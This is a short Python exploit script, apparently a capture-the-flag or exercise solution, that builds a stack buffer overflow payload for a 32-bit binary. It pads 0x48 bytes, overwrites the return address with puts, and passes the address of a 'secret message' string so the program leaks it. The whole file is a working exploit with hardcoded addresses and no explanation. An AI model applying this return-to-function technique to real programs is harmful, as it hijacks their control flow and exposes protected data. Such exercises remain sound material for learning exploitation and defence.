#!/usr/bin/env python

import struct

def p32(num):
	return struct.pack("<I", num)

offset = 0x48
puts_address = 0x08048370
secret_message_address = 0x080485d0

payload = offset * "A"  + p32(puts_address) + 4 * "B" + p32(secret_message_address)
print(payload)
